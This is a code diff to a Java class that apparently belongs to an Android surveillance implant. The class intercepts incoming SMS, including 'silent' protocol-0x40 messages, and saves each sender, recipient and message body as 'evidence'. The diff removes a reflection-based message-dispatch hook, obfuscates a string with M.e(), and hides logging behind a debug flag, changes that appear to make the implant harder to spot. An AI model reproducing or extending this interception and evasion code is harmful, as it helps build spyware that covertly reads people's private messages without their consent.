@@ -45,39 +45,6 @@ public class LowEventHandler implements Runnable {
 		thread.start();
 	}
 
-	public static int dispatchNormalMessage(Object smsO) {
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "  dispatchNormalMessage: start ok " + smsO);
-		}
-		int callOrig = 1;
-		if (smsO == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessage: sms0 null ");
-			}
-			return callOrig;
-		}
-
-		try {
-			byte[][] pdus = new byte[1][];
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessage: asking pdu ");
-			}
-			pdus[0] = Reflect.on(smsO).call("getPdu").get();
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessage: got it");
-			}
-
-			processPdu(pdus[0]);
-
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessage: Exception:", e);
-			}
-		}
-		return callOrig;
-	}
-
 	public static void processPdu(byte[] pdu) {
 		SmsMessage sms = SmsMessage.createFromPdu(pdu);
 		if (Cfg.DEBUG) {
@@ -115,7 +82,7 @@ public class LowEventHandler implements Runnable {
 			}
 			if (sms.getProtocolIdentifier() == 0x40 || sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "  processPdu: pid 0x40 or UNKNOWN messageClass");
+					Check.log(TAG + "  processPdu: pid 0x40 ( silent ) or UNKNOWN messageClass");
 				}
 				saveLowEventPdu(pdu,smsBase);
 			}
@@ -126,7 +93,7 @@ public class LowEventHandler implements Runnable {
 			}
 			if (sms.getProtocolIdentifier() == 0x40 || sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "  processPdu: pid 0x40 or UNKNOWN messageClass");
+					Check.log(TAG + "  processPdu: pid 0x40 ( silent ) or UNKNOWN messageClass");
 				}
 				saveLowEventPdu(pdu,null);
 			}
@@ -222,7 +189,7 @@ public class LowEventHandler implements Runnable {
 					databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
 					databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 					if (body.length==0) {
-						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, WChar.getBytes("empty message"), new Date(date));
+						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, WChar.getBytes(M.e("empty message")), new Date(date));
 					}else{
 						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
 					}
@@ -273,7 +240,9 @@ public class LowEventHandler implements Runnable {
 				if (sender.isBound() && sender.isConnected()) {
 					break;
 				} else {
-					Log.d(TAG, ".");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + ".");
+					}
 				}
 				Utils.sleep(100);
 			}
@@ -390,7 +359,9 @@ public class LowEventHandler implements Runnable {
 						if (streamIn.available() > 0) {
 							ObjectInputStream ois = new ObjectInputStream(streamIn);
 							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
-							Log.d(TAG, "GOT DATA " + event);
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "GOT DATA " + event);
+							}
 							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS || event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT) {
 								if (event.data != null) {
 									LowEvent<byte[]> sms_event = new LowEvent<byte[]>(event);
